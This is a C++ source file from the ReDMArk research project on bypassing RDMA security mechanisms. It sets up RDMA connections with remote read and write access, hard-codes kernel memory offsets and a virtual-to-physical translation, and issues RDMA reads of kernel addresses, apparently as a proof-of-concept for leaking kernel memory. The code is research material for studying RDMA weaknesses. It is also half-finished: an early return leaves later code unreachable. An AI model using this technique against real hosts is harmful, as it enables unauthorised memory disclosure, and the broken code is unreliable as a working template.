/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Launch a client that will be impersonated.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */

#include "verbsEP.hpp"
#include "connectRDMA.hpp"
#include <chrono>
#include "cxxopts.hpp"
#include <thread> 
#include <unistd.h>
//#include <rdma/ib_verbs.h>
// defining variable and offset from System.map
#define PID_OFFSET 2216
#define LIST_OFFSET 1960
#define INIT_ADDR 0xffffffffa0213480 
#define __START_KERNEL_MAP 0xffffffff80000000
#define PHYS_BASE 0x1d8bc00000 
#define PAGE_OFFSET 0xffff965a40000000 

// #define POOL_SIZE 1000000000ULL
// #define CHUNK 100000UL
// #define NUM_CHUNK POOL_SIZE / CHUNK
#define ONFLIGHT_THRESH 4000
struct obj_meta_t {
  uint64_t addr;
  uint32_t rkey;
};

std::vector<VerbsEP *> connections;
std::vector<struct obj_meta_t> objs;

cxxopts::ParseResult
parse(int argc, char* argv[])
{
    cxxopts::Options options(argv[0], "A victim client. It will be impersonated.");
    options
      .positional_help("[optional args]")
      .show_positional_help();
 
  try
  {
 
    options.add_options()
      ("a,address", "IP address of the victim", cxxopts::value<std::string>(), "IP")
      ("n,num_conn", "Number of connections", cxxopts::value<int>(), "num_conn")
      ("M,pool_size", "Memory pool size", cxxopts::value<uint64_t>(), "pool_size")
      ("r,repeat_times", "Repeat times", cxxopts::value<uint64_t>(), "repeat_times")
      ("c,chunk", "Chunk size", cxxopts::value<uint64_t>(), "chunk")
      ("t,dynamic_period", "Period (every t reqs) to change ACL for dynamic test", cxxopts::value<uint64_t>(), "dynamic_period")
      ("p,parallel", "Parallel (1) or sequential (0)", cxxopts::value<int>(), "parallel")
      ("help", "Print help")
     ;
 
    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    if (result.count("address") == 0 || result.count("num_conn") == 0
		    || result.count("pool_size") == 0
		    || result.count("repeat_times") == 0
		    || result.count("chunk") == 0
		    || result.count("dynamic_period") == 0
		    || result.count("parallel") == 0)
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

unsigned long __pa(unsigned long x){
    unsigned long y;
    y = x - __START_KERNEL_MAP;
//    printf("the y's value is %lx\n", y);
//    printf("the x+ y's value is %lx\n", y + __START_KERNEL_MAP);
    if (x>y){
        x = y + PHYS_BASE;
    }
    else {
        x = y + (__START_KERNEL_MAP - PAGE_OFFSET);
    }
//    printf("the phy value is %lx\n", x);
    return x;
}
 
void printQP(struct ibv_qp *qp) {
	uint32_t *raw = (uint32_t*)qp;
	printf("ibv_qp content:\n");
	for (uint32_t i = 0; i < sizeof(struct ibv_qp)/4; i++) {
		printf("%08x ", raw[i]);
	}
	printf("\nibv_context content:\n");
	raw = (uint32_t*)(qp->context);
	for (uint32_t i = 0; i < sizeof(struct ibv_context)/4; i++) {
		printf("%08x ", raw[i]);
	}
	printf("\n");
	printf("qp->context->cmd_fd,async_fd,num_comp_vectors: %d, %d, %d\n",
			qp->context->cmd_fd,
			qp->context->async_fd,
			qp->context->num_comp_vectors);
}
  
void print_data(VerbsEP *ep){

  struct ibv_qp_attr attr;
  struct ibv_qp_init_attr init_attr;
  int ret = ibv_query_qp(ep->qp, &attr, IBV_QP_RQ_PSN | IBV_QP_SQ_PSN | IBV_QP_AV, &init_attr );
  assert(ret==0 && "ibv_query_qp failed");
  printf("PSNs. receive-PSN: %u send-PSN %u \n", attr.rq_psn, attr.sq_psn);
  printf("interface_id, subnet_prefix: %lu, %lu\n", attr.ah_attr.grh.dgid.global.interface_id, attr.ah_attr.grh.dgid.global.subnet_prefix);
  printf("QPN %u \n",ep->qp->qp_num);
  printQP(ep->qp);
}

void read_obj_addr_key_from_file() {
  FILE *fp = fopen("obj_addr_key.txt", "r");
  uint64_t addr;
  uint32_t rkey;
  fscanf(fp, "%lu %u", &addr, &rkey);
  while (!feof(fp)) {
    objs.push_back({addr, rkey});
    fscanf(fp, "%lu %u", &addr, &rkey);
  }
  fclose(fp);
}


int main(int argc, char* argv[]){
  printf("yes is %llx", __pa(0xffff7bb2dc00));
  printf("yes is %llx", 0xffff7bb2dc00 - __START_KERNEL_MAP);
  printf("yes is %llx", 0x7bb2dc00 - __START_KERNEL_MAP);
//  return 1;
  // struct ib_qp ibqp;
  // printf("ib_qp address: %08x, %08x\n", &ibqp, &(ibqp.qp_num));

  auto allparams = parse(argc,argv);

  std::string ip = allparams["address"].as<std::string>();
  int num_conn = allparams["num_conn"].as<int>();
  uint64_t POOL_SIZE = allparams["pool_size"].as<uint64_t>();
  uint64_t repeat_times = allparams["repeat_times"].as<uint64_t>();
  uint64_t CHUNK = allparams["chunk"].as<uint64_t>();
  uint64_t dynamic_period = allparams["dynamic_period"].as<uint64_t>();
  int parallel = 0;
  if (allparams.count("parallel") != 0)
    parallel = allparams["parallel"].as<int>();

  int port = 9998;
  ClientRDMA * client = new ClientRDMA(const_cast<char*>(ip.c_str()),port);
  struct ibv_qp_init_attr attr;
  struct rdma_conn_param conn_param;
 
  memset(&attr, 0, sizeof(attr));
  attr.cap.max_send_wr = 4096; // 1;
  attr.cap.max_recv_wr = 1;
  attr.cap.max_send_sge = 1;
  attr.cap.max_recv_sge = 1;
  attr.cap.max_inline_data = 0;
  attr.qp_type = IBV_QPT_RC;

  memset(&conn_param, 0 , sizeof(conn_param));
  conn_param.responder_resources = 0;
  conn_param.initiator_depth =  0;
  conn_param.retry_count = 3;  
  conn_param.rnr_retry_count = 3;  
  
  struct ibv_pd* pd = NULL;
  struct ibv_qp_attr mod_attr;
  memset(&mod_attr, 0, sizeof(mod_attr));
  mod_attr.qp_access_flags = IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE;
  int ret;
  std::chrono::steady_clock::time_point init_start = std::chrono::steady_clock::now();
  for (int i = 0; i < num_conn; i++) {
    connections.push_back(client->connectEP(&attr,&conn_param,pd));
    if ((ret = ibv_modify_qp(connections[i]->qp, &mod_attr, IBV_QP_ACCESS_FLAGS))) {
      printf("Failed to change access flags, error_msg: %s\n", strerror(ret));
    }
  }
  std::chrono::steady_clock::time_point init_end = std::chrono::steady_clock::now();
  int64_t init_elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(init_end - init_start).count();
  printf("Initialization finished. Epalsed time: %lf\n", ((double)init_elapsed)/1000000000.);


  VerbsEP* ep = connections[0]; 
  pd = ep->pd;
  
//11  char* ptr = (char*)malloc(CHUNK);
//11  strcpy(ptr, "1234");
//11  struct ibv_mr * mr = ep->reg_mem(ptr,CHUNK);

  char *ptr;
  ptr = (char*)malloc(1050);
  memset(ptr, 2, 1050);
  struct ibv_mr * mr = ep->reg_mem(ptr, 1050);
  printf("test print");
//  printf("the content of the ptr is %c\n", *ptr);

  int tmp = 0;
  printf("Prepare file obj_addr_key.txt and enter 1 to continue\n");
  do {
    scanf("%d", &tmp);
  } while (tmp != 1);

  read_obj_addr_key_from_file();

  printf("Signal server we are ready\n");
//11  ep->post_recv(1, mr);

// testing
  printf("the wr is already posted actually");
// try blocking
  printf("blocking for ack");


  struct ibv_wc wc;
//11  while( ep->poll_recv_completion(&wc) == 0){

//11  }

//  printf("NOW the content of the ptr is %p\n", *ptr);

//  printf("A message is sent. Completion status is %d\n",wc.status);
  printf("Server is ready if completion status is good\n");
//  ibv_dereg_mr(mr);
//  return 1;






  srand(time(NULL));
  uint64_t obj_num = objs.size();
  uint64_t size = POOL_SIZE/obj_num;
  std::chrono::steady_clock::time_point start = std::chrono::steady_clock::now();
  // int *completion = new int[num_conn]{0};
  uint64_t completion = 0;
  uint64_t sent = 0;


    unsigned long addr = 0xffffffffa1266f10;
    int len = 8;
    printf("begin testing dowhile!!!\n\n\n");
    addr = __pa(addr);
    ep->read_signaled(1, (uint64_t)mr->addr, mr->lkey, (addr), objs[0].rkey, len);
    while(ep->poll_send_completion(&wc) == 0){
    }
    printf("addr is %lx\n", *(unsigned long *)ptr);
    addr = __pa(*(unsigned long *)ptr);
    unsigned long addr_o = 0x203b9df000;
    printf("addr is %lx\n", addr);
    int cc = 0;
    int dd = 0;
  
   printf("please starting iteration\n");
   init_start = std::chrono::steady_clock::now();

    
   init_end = std::chrono::steady_clock::now();
   init_elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(init_end - init_start).count();
   printf("Initialization finished. Epalsed time: %lf\n", ((double)init_elapsed)/1000000000.);


 
  printf("Prepare file obj_addr_key.txt and enter 2 to continue\n");
  do {
    scanf("%d", &tmp);
  } while (tmp != 2);

  ibv_dereg_mr(mr);
  return 1;

  if (parallel) {
    // for (int qp_id = 0; qp_id < num_conn; qp_id++) {
      // printf("Receiving the remaining requests' completions for qp %d ...\n", qp_id);
      printf("Receiving the remaining requests' completions ...\n");
      printf("Completion so far: %lu\n", completion);
      while(completion < sent){
        if (connections[0]->poll_send_completion(&wc) == 1) {
          if (wc.status != 0) {
            printf("ERROR: Completion status: %d\n",wc.status);
          }
          completion++;
          // printf("Completion so far: %d\n", completion);
        }
      }
    // }
  }
  std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();
  int64_t elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();

  printf("Finished. Epalsed time: %lf\n", ((double)elapsed)/1000000000.);
  return 0; 
}

 
 
 
